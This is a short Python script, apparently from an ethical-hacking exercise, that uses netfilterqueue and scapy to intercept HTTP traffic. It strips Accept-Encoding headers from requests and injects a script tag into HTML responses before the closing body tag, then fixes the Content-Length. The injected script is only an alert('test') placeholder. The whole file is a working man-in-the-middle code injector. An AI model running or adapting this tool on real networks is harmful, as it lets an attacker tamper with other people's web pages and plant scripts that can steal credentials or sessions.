#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load=scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport==80:
            print('[+]Request')
            load=re.sub("Accept-Encoding:.*?\\r\\n","",load)

        elif scapy_packet[scapy.TCP].sport==80:
            print('[+]Response')
            injection_code="<script>alert('test');</script>"
            load= load.replace("</body>",injection_code+"</body>")
            content_length_search=re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                contnet_length=content_length_search.group(1)
                new_content_length=int(contnet_length)+len(injection_code)
                load = load.replace(contnet_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()